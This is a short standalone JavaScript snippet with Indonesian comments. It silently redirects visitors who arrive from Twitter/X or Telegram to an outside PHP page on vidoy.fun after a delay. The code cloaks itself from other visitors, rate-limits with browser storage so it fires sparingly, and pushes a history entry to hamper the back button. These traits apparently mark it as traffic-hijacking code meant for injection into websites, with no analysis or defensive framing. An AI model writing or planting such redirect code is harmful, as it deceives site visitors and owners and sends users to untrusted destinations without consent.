(function () {
  try {
    // === SETTING ===
    var target     = "https://vidoy.fun/cB6Tyq0.php"; 
    var cooldownMs = 10 * 1000;   
    var delayMs    = 9000;        
    // ===============

    if (!/^https:\/\//i.test(target)) return;

    // Bypass manual via ?noredir=1
    var qs = location.search + location.hash;
    if (/[?#](?:.*[&?])?noredir=1/i.test(qs)) return;

    // Deteksi Twitter / Telegram
    var REF = String(document.referrer || "");
    var UA  = String(navigator.userAgent || "");
    var isX  = /(t\.co|twitter\.com)/i.test(REF) || /twitter/i.test(UA);
    var isTG = /(telegram|telegram-android|tgapp|tweb|tdesktop)/i.test(UA) || /(t\.me|telegram\.org)/i.test(REF);
    if (!(isX || isTG)) return;

    var page = location.origin + location.pathname;
    var sessKey = "auto_seen:" + page + "|" + target;
    var cdKey   = "auto_cd:"   + page + "|" + target;

    var now = Date.now();
    if (sessionStorage.getItem(sessKey)) return;
    var until = +localStorage.getItem(cdKey) || 0;
    if (now < until) return;

    sessionStorage.setItem(sessKey, "1");
    localStorage.setItem(cdKey, String(now + cooldownMs));

    // Sedikit bantalan history
    try { history.pushState({ hold:1 }, "", location.href); } catch(_){}

    // Redirect otomatis setelah delay
    setTimeout(function () {
      try { location.href = target; } catch(_) {}
      try { location.assign(target); } catch(_) {}
    }, delayMs);

    // Kalau bener-bener pindah, perpanjang cooldown
    var armed = true;
    function seenHidden(){
      if (!armed) return;
      if (document.visibilityState === "hidden"){
        armed = false;
        localStorage.setItem(cdKey, String(Date.now() + Math.max(30e3, cooldownMs)));
      }
    }
    document.addEventListener("visibilitychange", seenHidden, true);
    window.addEventListener("pagehide", function(){ seenHidden(); }, {capture:true, passive:true});
  } catch(_) {}
})();
